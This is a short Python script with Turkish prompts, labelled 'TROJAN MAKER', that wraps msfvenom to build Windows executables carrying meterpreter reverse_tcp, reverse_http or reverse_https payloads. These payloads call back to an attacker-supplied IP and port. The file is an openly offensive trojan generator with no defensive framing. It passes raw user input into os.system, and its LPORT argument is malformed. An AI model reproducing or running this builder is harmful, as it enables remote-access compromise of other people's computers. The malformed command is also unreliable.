#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet BHECY")
os.system("figlet TROJAN MAKER")

print("""

Trojan oluşturma Aracına Hoş Geldin...

""")

ip=input("Lokal ya da Dış ip giriniz : ")
port=input("portunu gir : ")

print("""

1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https

""")

payload= input("Payload numarası giriniz : ")
kayityeri=input("Trojan kayıt konumunu yazınız : ")

if payload=="1":
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT"+port+" -f exe -o "+kayityeri)
	
elif payload=="2":
	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST="+ip+" LPORT"+port+" -f exe -o "+kayityeri)

elif payload=="3":
	os.system("msfvenom -p windows/meterpreter/reverse_https LHOST="+ip+" LPORT"+port+" -f exe -o "+kayityeri)
	